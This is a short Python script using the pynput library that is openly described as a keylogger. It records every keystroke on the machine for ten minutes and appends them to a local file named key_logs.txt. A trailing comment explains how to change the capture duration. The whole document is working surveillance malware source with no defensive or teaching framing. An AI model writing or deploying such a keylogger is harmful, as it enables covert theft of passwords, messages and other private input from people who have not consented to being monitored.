from pynput.keyboard import Key, Listener
import time

start_time = time.time()
log_file = "key_logs.txt"
keys = []

def on_press(key):
    global keys

    # Handle special keys
    if key == Key.space:
        key = ' '
    elif key == Key.enter:
        key = '\n'
    elif key == Key.backspace:
        if keys:
            keys.pop()
        return
    else:
        key = str(key).replace("'", "")

    keys.append(key)

    # Write to file after 10 minutes
    if time.time() - start_time > 600:
        with open(log_file, "a") as file:
            file.write(''.join(keys))
            keys = []

        # Stop listener after 10 minutes
        if time.time() - start_time > 600:
            return False

with Listener(on_press=on_press) as listener:
    listener.join()

#This keylogger code writes keys to a file named key_logs.txt file. It does so for 10 minutes, you can modify this
#by modifying "if time.time() - start_time > 600". The 600 represents 60 secs * 10 minutes desired = 600 seconds. 
#You can modify to any number that you like. 